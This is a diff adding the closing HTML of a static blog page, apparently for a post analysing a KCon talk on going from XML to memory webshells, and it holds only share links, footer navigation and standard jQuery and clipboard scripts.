+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&title=从 xml 到内存马 -- kcon 议题解析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&title=从 xml 到内存马 -- kcon 议题解析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&title=从 xml 到内存马 -- kcon 议题解析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&title=从 xml 到内存马 -- kcon 议题解析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&name=从 xml 到内存马 -- kcon 议题解析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/&t=从 xml 到内存马 -- kcon 议题解析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024
+    wude
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
